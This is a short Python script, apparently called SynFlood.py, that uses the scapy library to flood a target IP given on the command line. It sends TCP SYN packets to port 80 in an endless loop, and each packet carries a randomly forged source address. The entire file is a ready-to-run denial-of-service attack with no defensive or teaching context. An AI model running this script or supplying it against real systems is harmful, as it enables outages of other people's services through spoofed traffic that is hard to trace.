import sys
import random
from scapy.all import send, IP, TCP

if len(sys.argv) < 2:
    print("SynFlood.py +target IP")
    sys.exit(0)

while 1:
    psrc = "%i.%i.%i.%i" % (
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254),
        random.randint(1, 254)
    )
    pdst = sys.argv[1]
    send(IP(src=psrc, dst=pdst)/TCP(dport=80, flags="S"))